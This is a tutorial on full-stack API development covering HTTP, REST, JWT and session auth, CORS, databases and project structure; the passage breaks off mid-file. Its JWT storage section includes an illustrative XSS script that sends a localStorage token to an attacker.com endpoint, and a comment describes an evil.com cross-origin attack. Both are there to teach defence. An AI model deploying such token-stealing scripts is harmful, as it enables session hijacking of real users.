# Complete Guide: APIs, HTTP, Authentication, and Full-Stack Integration

## 🎯 Core Architecture Rule

```
Frontend → Backend API → Database or Public APIs
```

**Never expose:**
- Database credentials to frontend
- API secret keys to frontend
- Business logic in frontend

**Backend decides:**
- When to fetch from database (user data, orders, posts)
- When to call external APIs (payment processing, email sending, weather data)
- How to combine multiple data sources

---

## 🔐 Critical Security Principles

### 1. Frontend Environment Variables Are Public

**⚠️ Frontend env vars are public by design—treat them as readable by anyone.**

Frontend build tools (Vite, Create React App, Next.js) bundle environment variables into JavaScript files that are downloaded to users' browsers. Anyone can inspect these files using browser DevTools or view-source.

**❌ NEVER store in frontend:**
```javascript
// .env (Vite/React) - EXPOSED IN BROWSER BUNDLE
VITE_STRIPE_SECRET_KEY=sk_live_xxx    // ❌ Anyone can extract this
VITE_DATABASE_PASSWORD=secret123       // ❌ Visible in DevTools
VITE_JWT_SECRET=mysecret              // ❌ Compromises all tokens
```

**✅ Only store in frontend:**
```javascript
// .env (Vite/React) - Safe to expose
VITE_API_URL=https://api.myapp.com           // ✅ Public endpoint
VITE_GOOGLE_MAPS_API_KEY=AIza...             // ✅ Browser key with domain restrictions
VITE_STRIPE_PUBLISHABLE_KEY=pk_live_xxx      // ✅ Designed for client-side use
VITE_APP_VERSION=1.2.0                       // ✅ Non-sensitive metadata
```

**Why:** Frontend code (including .env values) is bundled into JavaScript files that anyone can read in browser DevTools.

---

### 2. Backend Is the Secret Keeper

**✅ All secrets in backend only:**
```javascript
// .env (Backend Node.js) - NEVER EXPOSED TO CLIENT
PORT=3000
NODE_ENV=production

# Database credentials
DB_HOST=db.internal.com
DB_USER=app_user
DB_PASSWORD=complex_secure_password_here

# Secret keys
JWT_SECRET=minimum-32-character-random-string-required
STRIPE_SECRET_KEY=sk_live_xxxxxxxxx
SENDGRID_API_KEY=SG.xxxxxxxxxxxxx
AWS_SECRET_ACCESS_KEY=xxxxxxxxxxxxxxx

# External API keys
OPENAI_API_KEY=sk-xxxxxxxxxxxxx
TWILIO_AUTH_TOKEN=xxxxxxxxxxxxxxx
```

**Access pattern:**
```javascript
// Frontend - no secrets
const response = await fetch(`${VITE_API_URL}/api/v1/send-email`, {
  method: 'POST',
  body: JSON.stringify({ to: 'user@example.com', message: 'Hello' })
});

// Backend - uses secret
app.post('/api/v1/send-email', async (req, res) => {
  await sendgrid.send({
    api_key: process.env.SENDGRID_API_KEY,  // Secret stays on server
    to: req.body.to,
    from: 'noreply@myapp.com',
    text: req.body.message
  });
  res.json({ success: true });
});
```

---

### 3. Frontend Communicates ONLY via Backend APIs

**❌ WRONG - Direct database access:**
```javascript
// Frontend - NEVER DO THIS
import { Pool } from 'pg';  // ❌ Exposes DB credentials
const db = new Pool({ 
  host: 'db.myapp.com', 
  password: 'secret' 
});
const users = await db.query('SELECT * FROM users');
```

**❌ WRONG - Direct external API with secret:**
```javascript
// Frontend - NEVER DO THIS
const stripe = Stripe('sk_live_SECRET_KEY');  // ❌ Secret key exposed
const charge = await stripe.charges.create({...});
```

**✅ CORRECT - Always through backend:**
```javascript
// Frontend - proxy through backend
const response = await fetch('/api/v1/users');  // ✅ Backend fetches from DB
const users = await response.json();

const payment = await fetch('/api/v1/create-payment', {  // ✅ Backend calls Stripe
  method: 'POST',
  body: JSON.stringify({ amount: 5000 })
});
```

**Exception - Public client-side APIs:**
```javascript
// Frontend - OK for client-side keys with domain restrictions
const stripe = Stripe('pk_live_PUBLISHABLE_KEY');  // ✅ Designed for browsers
const maps = new google.maps.Map({
  apiKey: 'AIza_BROWSER_KEY'  // ✅ Restricted to your domain
});
```

---

### 4. JWT Storage: HttpOnly Cookies vs localStorage

**Decision matrix:**

| App Type | Storage Method | Reason |
|----------|----------------|--------|
| Banking, Healthcare, Payment | **HttpOnly cookies** | XSS protection mandatory |
| E-commerce, SaaS | **HttpOnly cookies** | User financial data at risk |
| Public dashboards, Blogs | **localStorage** | Acceptable risk, simpler implementation |
| Internal admin tools | **localStorage** | Trusted user base, lower risk |

**HttpOnly Cookies (High Security):**
```javascript
// Backend - login route
app.post('/api/v1/login', async (req, res) => {
  const user = await authenticateUser(req.body);
  const token = jwt.sign({ userId: user.id }, process.env.JWT_SECRET, { expiresIn: '7d' });
  
  // Set HttpOnly cookie
  res.cookie('token', token, {
    httpOnly: true,      // ✅ Not accessible via JavaScript (XSS protection)
    secure: true,        // ✅ HTTPS only
    sameSite: 'strict',  // ✅ CSRF protection
    maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days
  });
  
  res.json({ success: true, user: { id: user.id, name: user.name } });
});

// Frontend - no manual token handling needed
fetch('/api/v1/profile', {
  credentials: 'include'  // ✅ Browser auto-sends cookie
});
```

**⚠️ Use CSRF protection when using HttpOnly cookies:**
```javascript
// Install: npm install csurf
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

// Apply to state-changing routes
app.post('/api/v1/transfer-money', csrfProtection, (req, res) => {
  // CSRF token validated automatically
  // Only requests with valid token can proceed
});

// Send CSRF token to frontend
app.get('/api/v1/csrf-token', csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// Frontend includes token in requests
const { csrfToken } = await fetch('/api/v1/csrf-token').then(r => r.json());
fetch('/api/v1/transfer-money', {
  method: 'POST',
  headers: { 'CSRF-Token': csrfToken },
  credentials: 'include'
});
```

**Why CSRF matters with cookies:** Cookies are sent automatically by browsers. Without CSRF protection, a malicious site could make requests to your API using the victim's cookies. `sameSite: 'strict'` provides basic protection, but explicit CSRF tokens are recommended for sensitive operations.

**localStorage (Lower Security, Higher Convenience):**
```javascript
// Frontend - login
const response = await fetch('/api/v1/login', {
  method: 'POST',
  body: JSON.stringify({ email, password })
});
const { token } = await response.json();
localStorage.setItem('token', token);  // ⚠️ Vulnerable to XSS

// Frontend - authenticated requests
fetch('/api/v1/profile', {
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('token')}`
  }
});
```

**XSS Risk Example:**
```javascript
// If attacker injects malicious script into your page:
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('token')  // ❌ Attacker steals token
  });
</script>

// HttpOnly cookies are immune:
<script>
  console.log(document.cookie);  // ✅ Returns empty string for HttpOnly cookies
</script>
```

---

### 5. CORS Configuration Rules

**❌ FORBIDDEN - Browser will reject:**
```javascript
// Backend CORS config
app.use(cors({
  origin: '*',           // ❌ Wildcard
  credentials: true      // ❌ With credentials
}));
// Result: Browser throws error - "wildcard with credentials not allowed"
```

**⚠️ UNSAFE - Development only:**
```javascript
// Development - permissive for local testing
if (process.env.NODE_ENV === 'development') {
  app.use(cors({
    origin: ['http://localhost:3000', 'http://localhost:5173'],
    credentials: true
  }));
}
```

**✅ PRODUCTION - Strict origin list:**
```javascript
// Production CORS
const allowedOrigins = [
  'https://myapp.com',
  'https://www.myapp.com',
  'https://admin.myapp.com'
];

app.use(cors({
  origin: (origin, callback) => {
    // Allow requests with no origin (mobile apps, Postman)
    if (!origin) return callback(null, true);
    
    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
```

**Environment-based config:**
```javascript
// .env
ALLOWED_ORIGINS=https://myapp.com,https://admin.myapp.com

// Backend
const allowedOrigins = process.env.ALLOWED_ORIGINS.split(',');

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('CORS policy violation'));
    }
  },
  credentials: true
}));
```

**Security Impact:**
```javascript
// With credentials: true, cookies are sent cross-origin
// If origin: '*', any website could make authenticated requests to your API
// Example attack:
// evil.com could call: fetch('https://yourapi.com/api/transfer-money', {credentials: 'include'})
// and steal user's session cookie to perform actions on their behalf
```

---

## Table of Contents
1. [Critical Security Principles](#-critical-security-principles)
2. [What is an API?](#what-is-an-api)
3. [HTTP Protocol Explained](#http-protocol-explained)
4. [REST API Principles](#rest-api-principles)
5. [HTTP Methods (Verbs)](#http-methods-verbs)
6. [Authentication & Authorization](#authentication--authorization)
7. [Database Integration](#database-integration)
8. [Frontend ↔ Backend Connection](#frontend--backend-connection)
9. [Backend ↔ Database Connection](#backend--database-connection)
10. [Backend ↔ Public APIs](#backend--public-apis)
11. [Complete Working Example](#complete-working-example)
12. [Architecture Diagram](#architecture-diagram)

---

## What is an API?

**API = Application Programming Interface**

A contract that defines how software components communicate.

### Types of APIs
- **REST API:** Uses HTTP, stateless, resource-based (most common for web)
- **GraphQL:** Query language for APIs, client specifies exact data needed
- **SOAP:** XML-based, enterprise-heavy protocol
- **WebSocket:** Real-time bidirectional communication

### Real-World Analogy
**Restaurant Menu = API Documentation**
- Menu lists what you can order (endpoints)
- You place order (HTTP request)
- Kitchen prepares food (backend processes)
- Waiter brings food (HTTP response)

---

## HTTP Protocol Explained

**TL;DR:** Client sends request (method + URL + headers + body) → Server sends response (status code + headers + body). Status codes: 2xx = success, 4xx = client error, 5xx = server error.

---

**HTTP = HyperText Transfer Protocol**

Foundation of web communication. Client sends request, server sends response.

### HTTP Request Structure
```
POST /api/users HTTP/1.1
Host: api.example.com
Content-Type: application/json
Authorization: Bearer eyJhbGc...

{
  "name": "John",
  "email": "john@example.com"
}
```

**Parts:**
1. **Method:** POST (what action to perform)
2. **Path:** /api/users (resource location)
3. **Headers:** Metadata (content type, auth token)
4. **Body:** Data payload (JSON, form data, etc.)

### HTTP Response Structure
```
HTTP/1.1 201 Created
Content-Type: application/json

{
  "id": 123,
  "name": "John",
  "email": "john@example.com"
}
```

**Parts:**
1. **Status Code:** 201 (operation result)
2. **Headers:** Response metadata
3. **Body:** Response data

### HTTP Status Codes

| Code | Meaning | Use Case |
|------|---------|----------|
| **2xx Success** |
| 200 | OK | Successful GET, PUT, PATCH |
| 201 | Created | Successful POST (resource created) |
| 204 | No Content | Successful DELETE |
| **3xx Redirection** |
| 301 | Moved Permanently | URL changed forever |
| 302 | Found | Temporary redirect |
| **4xx Client Errors** |
| 400 | Bad Request | Invalid data sent |
| 401 | Unauthorized | Missing/invalid authentication |
| 403 | Forbidden | Authenticated but no permission |
| 404 | Not Found | Resource doesn't exist |
| 429 | Too Many Requests | Rate limit exceeded |
| **5xx Server Errors** |
| 500 | Internal Server Error | Server crashed |
| 502 | Bad Gateway | Server got invalid response from upstream |
| 503 | Service Unavailable | Server overloaded/down |

---

## REST API Principles

**REST = Representational State Transfer**

### 6 Constraints

1. **Client-Server Separation**
   - Frontend and backend are independent
   - Can be developed/deployed separately

2. **Stateless**
   - Each request contains all info needed
   - Server doesn't store client state between requests
   - Auth token sent with every request

3. **Cacheable**
   - Responses should indicate if they can be cached
   - `Cache-Control: max-age=3600`

4. **Uniform Interface**
   - Resources identified by URLs
   - `/users/123` not `/getUserById?id=123`

5. **Layered System**
   - Client doesn't know if connected to end server or intermediary
   - Load balancers, proxies transparent to client

6. **Code on Demand (Optional)**
   - Server can send executable code (JavaScript)
   - **Rarely used in modern REST APIs** - creates security concerns and tight coupling

### Resource Naming Best Practices

✅ **Good**
```
# API Versioning (recommended)
GET    /api/v1/users              # Version in URL
GET    /api/v1/users/123          # Get specific user
POST   /api/v1/users              # Create user
PUT    /api/v1/users/123          # Update entire user
PATCH  /api/v1/users/123          # Update partial user
DELETE /api/v1/users/123          # Delete user
GET    /api/v1/users/123/orders   # Nested resource
```

❌ **Bad**
```
GET    /getUsers           # Verb in URL
POST   /user/create        # Redundant action
GET    /users/delete/123   # Wrong method
PUT    /updateUser?id=123  # Query param for ID
```

**Why versioning matters:** Breaking changes (removing fields, changing formats) won't break old clients. Use `/api/v1`, `/api/v2` when making incompatible changes.

---

## HTTP Methods (Verbs)

### GET
**Purpose:** Retrieve data (read-only)

```javascript
// Frontend
fetch('https://api.example.com/api/v1/users/123')
  .then(res => res.json())
  .then(data => console.log(data));

// Backend (Express)
app.get('/api/v1/users/:id', (req, res) => {
  const user = db.findUserById(req.params.id);
  res.json(user);
});
```

**Key Points:**
- No body in request
- Should not modify data (idempotent)
- Can be cached
- Parameters in URL query string: `/api/v1/users?role=admin&limit=10`

---

### POST
**Purpose:** Create new resource

```javascript
// Frontend
fetch('https://api.example.com/api/v1/users', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ name: 'John', email: 'john@ex.com' })
})

// Backend
app.post('/api/v1/users', (req, res) => {
  const newUser = db.createUser(req.body);
  res.status(201).json(newUser); // 201 Created
});
```

**Key Points:**
- Data in request body
- Not idempotent (multiple calls = multiple resources)
- Returns 201 Created + new resource
- Use for: user registration, creating posts, uploading files

---

### PUT
**Purpose:** Replace entire resource

```javascript
// Frontend - must send ALL fields
fetch('https://api.example.com/api/v1/users/123', {
  method: 'PUT',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    name: 'John Updated',
    email: 'new@ex.com',
    role: 'admin' // Must include all fields
  })
})

// Backend
app.put('/api/v1/users/:id', (req, res) => {
  const updated = db.replaceUser(req.params.id, req.body);
  res.json(updated);
});
```

**Key Points:**
- Idempotent (same request multiple times = same result)
- Replaces entire resource
- Missing fields = set to null/default

---

### PATCH
**Purpose:** Partial update

```javascript
// Frontend - only send fields to update
fetch('https://api.example.com/api/v1/users/123', {
  method: 'PATCH',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ email: 'newemail@ex.com' }) // Only email
})

// Backend
app.patch('/api/v1/users/:id', (req, res) => {
  const updated = db.updateUserFields(req.params.id, req.body);
  res.json(updated);
});
```

**Key Points:**
- Only modified fields in request
- More efficient than PUT
- Use for: profile updates, toggling status

---

### DELETE
**Purpose:** Remove resource

```javascript
// Frontend
fetch('https://api.example.com/api/v1/users/123', {
  method: 'DELETE'
})

// Backend
app.delete('/api/v1/users/:id', (req, res) => {
  db.deleteUser(req.params.id);
  res.status(204).send(); // 204 No Content
});
```

**Key Points:**
- No body in request or response
- Idempotent
- Returns 204 No Content or 200 with confirmation message

---

### Method Comparison

| Method | Safe? | Idempotent? | Use Case |
|--------|-------|-------------|----------|
| GET | Yes | Yes | Read data |
| POST | No | No | Create resource |
| PUT | No | Yes | Full replace |
| PATCH | No | Depends* | Partial update |
| DELETE | No | Yes | Remove resource |

*PATCH idempotency depends on implementation:
- **Idempotent:** `PATCH /users/123 {"email": "new@ex.com"}` - always sets to same value
- **Not idempotent:** `PATCH /users/123 {"credits": "+10"}` - increments each time

---

## Authentication & Authorization

**TL;DR:** Authentication = who you are (login), Authorization = what you can do (permissions). Use JWT tokens for stateless auth, sessions for traditional server-rendered apps. Never store JWT in localStorage for sensitive apps - prefer HttpOnly cookies.

---

### Authentication
**Who are you?** Verifying identity.

### Authorization
**What can you do?** Checking permissions.

---

### 1. Session-Based Authentication (Traditional)

**Flow:**
1. User logs in with credentials
2. Server creates session, stores in database
3. Server sends session ID as cookie
4. Browser automatically sends cookie with each request
5. Server validates session ID against database

```javascript
// Backend - Login
app.post('/login', async (req, res) => {
  const user = await db.findUser(req.body.email);
  if (!user || !bcrypt.compareSync(req.body.password, user.passwordHash)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Create session
  req.session.userId = user.id; // express-session handles storage
  res.json({ message: 'Logged in' });
});

// Protected route
app.get('/profile', (req, res) => {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not logged in' });
  }
  const user = db.findUserById(req.session.userId);
  res.json(user);
});
```

**Pros:** Simple, secure (HttpOnly cookies prevent XSS)  
**Cons:** Not scalable (session storage), hard for mobile apps

---

### 2. Token-Based Authentication (JWT)

**JWT = JSON Web Token**

**Flow:**
1. User logs in
2. Server creates JWT, signs with secret key
3. Client stores token (localStorage/cookie)
4. Client sends token in `Authorization` header
5. Server verifies signature without database lookup

```javascript
// Backend - Login
const jwt = require('jsonwebtoken');

app.post('/login', async (req, res) => {
  const user = await db.findUser(req.body.email);
  if (!user || !bcrypt.compareSync(req.body.password, user.passwordHash)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Create JWT
  const token = jwt.sign(
    { userId: user.id, role: user.role }, // Payload
    process.env.JWT_SECRET,               // Secret key
    { expiresIn: '7d' }                   // Options
  );
  
  res.json({ token });
});

// Middleware
const authenticate = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1]; // "Bearer <token>"
  if (!token) return res.status(401).json({ error: 'No token' });
  
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded; // { userId: 123, role: 'admin' }
    next();
  } catch (err) {
    res.status(403).json({ error: 'Invalid token' });
  }
};

// Protected route
app.get('/profile', authenticate, (req, res) => {
  const user = db.findUserById(req.user.userId);
  res.json(user);
});
```

```javascript
// Frontend
// Store token after login
localStorage.setItem('token', response.token);

// Send with requests
fetch('/profile', {
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('token')}`
  }
});
```

**JWT Structure:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMywicm9sZSI6ImFkbWluIn0.signature
└─────────── Header ──────────┘ └─────── Payload ──────┘ └─ Signature ─┘
```

**Pros:** Stateless, scalable, works for mobile  
**Cons:** Can't revoke until expiry (unless implement blacklist)

**For JWT storage security (localStorage vs HttpOnly cookies), see [Critical Security Principles](#-critical-security-principles).**

---

### 3. OAuth 2.0 (Third-Party Login)

**Use when:** "Login with Google/GitHub/Facebook"

**Flow:**
1. User clicks "Login with Google"
2. Redirect to Google's auth page
3. User approves permissions
4. Google redirects back with authorization code
5. Your backend exchanges code for access token
6. Use token to fetch user info from Google

```javascript
// Backend (using Passport.js)
const passport = require('passport');
const GoogleStrategy = require('passport-google-oauth20').Strategy;

passport.use(new GoogleStrategy({
    clientID: process.env.GOOGLE_CLIENT_ID,
    clientSecret: process.env.GOOGLE_CLIENT_SECRET,
    callbackURL: "http://localhost:3000/auth/google/callback"
  },
  async (accessToken, refreshToken, profile, done) => {
    // Find or create user in your DB
    let user = await db.findUserByGoogleId(profile.id);
    if (!user) {
      user = await db.createUser({
        googleId: profile.id,
        email: profile.emails[0].value,
        name: profile.displayName
      });
    }
    done(null, user);
  }
));

app.get('/auth/google', passport.authenticate('google', { scope: ['profile', 'email'] }));

app.get('/auth/google/callback', 
  passport.authenticate('google', { failureRedirect: '/login' }),
  (req, res) => {
    // Create JWT for your app
    const token = jwt.sign({ userId: req.user.id }, process.env.JWT_SECRET);
    res.redirect(`http://frontend.com?token=${token}`);
  }
);
```

---

### Authorization (Role-Based Access Control)

```javascript
// Middleware to check roles
const authorize = (...roles) => {
  return (req, res, next) => {
    if (!roles.includes(req.user.role)) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    next();
  };
};

// Only admins can delete users
app.delete('/api/v1/users/:id', 
  authenticate, 
  authorize('admin'), 
  (req, res) => {
    db.deleteUser(req.params.id);
    res.status(204).send();
  }
);

// Admins and moderators can edit posts
app.put('/api/v1/posts/:id', 
  authenticate, 
  authorize('admin', 'moderator'), 
  (req, res) => {
    // ...
  }
);
```

---

## Database Integration

**TL;DR:** Backend connects to database to store/retrieve your app's data (users, posts, orders). Use SQL for structured data with relationships, NoSQL for flexible schemas and high write throughput.

---

### When Backend Uses Database vs External APIs

**Backend → Database (Your data):**
- User accounts, profiles, settings
- Application data (posts, comments, products, orders)
- Internal business logic state
- Anything you need to persist and query

**Backend → External Public APIs (Third-party services):**
- Payment processing (Stripe, PayPal)
- Email sending (SendGrid, Mailgun)
- SMS notifications (Twilio)
- Weather, maps, stock prices
- AI services (OpenAI, cloud vision)

**Backend → Both:**
```javascript
// Create order in YOUR database
const order = await db.createOrder({ userId, items, total });

// Charge payment via EXTERNAL API
const payment = await stripe.charges.create({ amount: total, source: token });

// Send confirmation email via EXTERNAL API
await sendgrid.send({ to: user.email, subject: 'Order confirmed' });
```

---

### SQL vs NoSQL

| SQL (Relational) | NoSQL (Document/Key-Value) |
|------------------|----------------------------|
| PostgreSQL, MySQL | MongoDB, Firebase |
| Fixed schema | Flexible schema |
| ACID transactions | Eventual consistency |
| Use: Financial data, user accounts | Use: Logs, social feeds, real-time |

---

### PostgreSQL Example

**Install:**
```bash
npm install pg
```

**config/database.js**
```javascript
const { Pool } = require('pg');

const pool = new Pool({
  host: process.env.DB_HOST || 'localhost',
  port: process.env.DB_PORT || 5432,
  database: process.env.DB_NAME,
  user: process.env.DB_USER,
  password: process.env.DB_PASSWORD,
  max: 20, // Connection pool size
  idleTimeoutMillis: 30000,
  connectionTimeoutMillis: 2000,
});

module.exports = {
  query: (text, params) => pool.query(text, params),
};
```

**models/User.js**
```javascript
const db = require('../config/database');

class User {
  static async findById(id) {
    const { rows } = await db.query('SELECT * FROM users WHERE id = $1', [id]);
    return rows[0];
  }

  static async create(userData) {
    const { rows } = await db.query(
      'INSERT INTO users (name, email, password_hash) VALUES ($1, $2, $3) RETURNING *',
      [userData.name, userData.email, userData.passwordHash]
    );
    return rows[0];
  }

  static async update(id, fields) {
    const { rows } = await db.query(
      'UPDATE users SET name = $1, email = $2 WHERE id = $3 RETURNING *',
      [fields.name, fields.email, id]
    );
    return rows[0];
  }

  static async delete(id) {
    await db.query('DELETE FROM users WHERE id = $1', [id]);
  }
}

module.exports = User;
```

---

### MongoDB Example

**Install:**
```bash
npm install mongoose
```

**config/database.js**
```javascript
const mongoose = require('mongoose');

const connectDB = async () => {
  try {
    await mongoose.connect(process.env.MONGO_URI, {
      useNewUrlParser: true,
      useUnifiedTopology: true,
    });
    console.log('MongoDB connected');
  } catch (err) {
    console.error(err);
    process.exit(1);
  }
};

module.exports = connectDB;
```

**models/User.js**
```javascript
const mongoose = require('mongoose');

const userSchema = new mongoose.Schema({
  name: { type: String, required: true },
  email: { type: String, required: true, unique: true },
  passwordHash: { type: String, required: true },
  role: { type: String, default: 'user' },
  createdAt: { type: Date, default: Date.now }
});

module.exports = mongoose.model('User', userSchema);
```

**Usage:**
```javascript
const User = require('./models/User');

// Create
const user = await User.create({ name: 'John', email: 'j@ex.com', passwordHash: 'hash' });

// Find
const user = await User.findById('507f1f77bcf86cd799439011');
const users = await User.find({ role: 'admin' });

// Update
await User.findByIdAndUpdate(id, { name: 'New Name' });

// Delete
await User.findByIdAndDelete(id);
```

---

## Frontend ↔ Backend Connection

### Setup CORS (Backend)

**Problem:** Browser blocks requests from different origin (domain/port)

**For complete CORS security configuration, see [Critical Security Principles](#-critical-security-principles).**

```javascript
// Backend - app.js
const cors = require('cors');

// Environment-based configuration (recommended)
const allowedOrigins = process.env.ALLOWED_ORIGINS?.split(',') || ['http://localhost:5173'];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
```

**.env configuration:**
```bash
# Development
ALLOWED_ORIGINS=http://localhost:3000,http://localhost:5173

# Production
ALLOWED_ORIGINS=https://myapp.com,https://www.myapp.com
```

---

### Axios Setup (Frontend)

```javascript
// src/api/client.js
import axios from 'axios';

const api = axios.create({
  baseURL: 'http://localhost:3000/api', // Backend URL
  timeout: 10000,
});

// Automatically add auth token to requests
api.interceptors.request.use((config) => {
  const token = localStorage.getItem('token');
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

// Handle errors globally
api.interceptors.response.use(
  (response) => response,
  (error) => {
    if (error.response?.status === 401) {
      // Redirect to login
      window.location.href = '/login';
    }
    return Promise.reject(error);
  }
);

export default api;
```

**Usage in React:**
```javascript
import api from './api/client';

function UserProfile() {
  const [user, setUser] = useState(null);

  useEffect(() => {
    api.get('/api/v1/users/me')
      .then(res => setUser(res.data))
      .catch(err => console.error(err));
  }, []);

  const updateProfile = async (data) => {
    await api.patch('/api/v1/users/me', data);
  };

  return <div>{user?.name}</div>;
}
```

---

### Environment Variables

**⚠️ CRITICAL:** Frontend environment variables are publicly visible. See [Critical Security Principles](#-critical-security-principles) for what to never store in frontend.

**Frontend (.env.local or .env) - Vite/React**
```bash
# ✅ Safe to expose - these are public
VITE_API_URL=http://localhost:3000
VITE_APP_NAME=MyApp
VITE_STRIPE_PUBLISHABLE_KEY=pk_test_xxx  # Client-side key only
VITE_GOOGLE_MAPS_API_KEY=AIza...         # Browser key with domain restrictions
```

**Backend (.env) - Node.js**
```bash
# ✅ Secrets - never expose to frontend
PORT=3000
NODE_ENV=development

# Database credentials (NEVER in frontend)
DB_HOST=localhost
DB_NAME=myapp
DB_USER=postgres
DB_PASSWORD=secure_password_here

# Secret keys (NEVER in frontend)
JWT_SECRET=minimum-32-character-random-string
STRIPE_SECRET_KEY=sk_test_xxx
SENDGRID_API_KEY=SG.xxx

# CORS configuration
ALLOWED_ORIGINS=http://localhost:5173,http://localhost:3000
```

**Usage:**
```javascript
// Frontend (Vite) - all vars prefixed with VITE_ are exposed
const API_URL = import.meta.env.VITE_API_URL;

// Backend (Node) - all vars are private
const PORT = process.env.PORT || 3000;
const jwtSecret = process.env.JWT_SECRET;
```

---

### Standardized API Error Responses

**Consistent error format helps frontend handle errors predictably:**

```javascript
// Backend - Error handler middleware
app.use((err, req, res, next) => {
  const statusCode = err.statusCode || 500;
  
  res.status(statusCode).json({
    success: false,
    error: {
      message: err.message,
      code: err.code || 'INTERNAL_ERROR',
      ...(process.env.NODE_ENV === 'development' && { stack: err.stack })
    }
  });
});

// Usage in controllers
class ValidationError extends Error {
  constructor(message) {
    super(message);
    this.statusCode = 400;
    this.code = 'VALIDATION_ERROR';
  }
}

throw new ValidationError('Email already exists');
```

**Frontend handles uniformly:**
```javascript
api.post('/api/v1/users', data)
  .catch(err => {
    if (err.response?.data?.error?.code === 'VALIDATION_ERROR') {
      showValidationErrors(err.response.data.error.message);
    }
  });
```

**Common error codes:**
- `VALIDATION_ERROR` - Invalid input (400)
- `UNAUTHORIZED` - Not logged in (401)
- `FORBIDDEN` - No permission (403)
- `NOT_FOUND` - Resource missing (404)
- `RATE_LIMIT_EXCEEDED` - Too many requests (429)
- `INTERNAL_ERROR` - Server error (500)

---

## Backend ↔ Database Connection

### Connection Pooling Best Practices

```javascript
const { Pool } = require('pg');

const pool = new Pool({
  max: 20,                      // Max connections in pool
  idleTimeoutMillis: 30000,     // Close idle connections after 30s
  connectionTimeoutMillis: 2000 // Fail if can't connect in 2s
});

// Graceful shutdown
process.on('SIGTERM', () => {
  pool.end(() => {
    console.log('Pool closed');
    process.exit(0);
  });
});
```

### Transaction Example

```javascript
async function transferMoney(fromId, toId, amount) {
  const client = await pool.connect();
  
  try {
    await client.query('BEGIN');
    
    await client.query('UPDATE accounts SET balance = balance - $1 WHERE id = $2', [amount, fromId]);
    await client.query('UPDATE accounts SET balance = balance + $1 WHERE id = $2', [amount, toId]);
    
    await client.query('COMMIT');
  } catch (err) {
    await client.query('ROLLBACK');
    throw err;
  } finally {
    client.release(); // Return connection to pool
  }
}
```

---

## Backend ↔ Public APIs

### Axios with Error Handling

```javascript
// services/external/weatherApi.js
const axios = require('axios');

const weatherClient = axios.create({
  baseURL: 'https://api.openweathermap.org/data/2.5',
  timeout: 5000,
  params: {
    appid: process.env.WEATHER_API_KEY
  }
});

// Retry logic
const axiosRetry = require('axios-retry');
axiosRetry(weatherClient, {
  retries: 3,
  retryDelay: axiosRetry.exponentialDelay
});

async function getCurrentWeather(city) {
  try {
    const { data } = await weatherClient.get('/weather', {
      params: { q: city }
    });
    return {
      temp: data.main.temp,
      description: data.weather[0].description
    };
  } catch (err) {
    if (err.response?.status === 404) {
      throw new Error('City not found');
    }
    throw new Error('Weather service unavailable');
  }
}

module.exports = { getCurrentWeather };
```

### Rate Limiting External APIs

```javascript
const Bottleneck = require('bottleneck');

const limiter = new Bottleneck({
  maxConcurrent: 5,    // Max 5 concurrent requests
  minTime: 200         // Minimum 200ms between requests
});

const callExternalApi = limiter.wrap(async (endpoint) => {
  return axios.get(endpoint);
});
```

---

## Complete Working Example

### Project Structure
```
fullstack-app/
├── backend/
│   ├── src/
│   │   ├── config/
│   │   │   └── database.js
│   │   ├── middleware/
│   │   │   └── auth.js
│   │   ├── models/
│   │   │   └── User.js
│   │   ├── routes/
│   │   │   └── users.routes.js
│   │   ├── controllers/
│   │   │   └── users.controller.js
│   │   ├── services/
│   │   │   ├── users.service.js
│   │   │   └── external/
│   │   │       └── emailApi.js
│   │   └── app.js
│   ├── .env
│   ├── package.json
│   └── server.js
│
└── frontend/
    ├── src/
    │   ├── api/
    │   │   └── client.js
    │   ├── components/
    │   │   └── UserProfile.jsx
    │   └── App.jsx
    ├── .env
    └── package.json
```

---

### Backend Files

**server.js**
```javascript
require('dotenv').config();
const app = require('./src/app');
const connectDB = require('./src/config/database');

const PORT = process.env.PORT || 3000;

connectDB().then(() => {
  app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
  });
});
```

**src/app.js**
```javascript
const express = require('express');
const cors = require('cors');
const userRoutes = require('./routes/users.routes');

const app = express();

// Middleware
app.use(cors({ origin: process.env.FRONTEND_URL, credentials: true }));
app.use(express.json());

// Routes
app.use('/api/v1/users', userRoutes);

// Error handler
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ error: err.message });
});

module.exports = app;
```

**src/routes/users.routes.js**
```javascript
const express = require('express');
const router = express.Router();
const controller = require('../controllers/users.controller');
const auth = require('../middleware/auth');

router.post('/register', controller.register);
router.post('/login', controller.login);
router.get('/me', auth, controller.getProfile);
router.patch('/me', auth, controller.updateProfile);

module.exports = router;
```

**src/controllers/users.controller.js**
```javascript
const userService = require('../services/users.service');

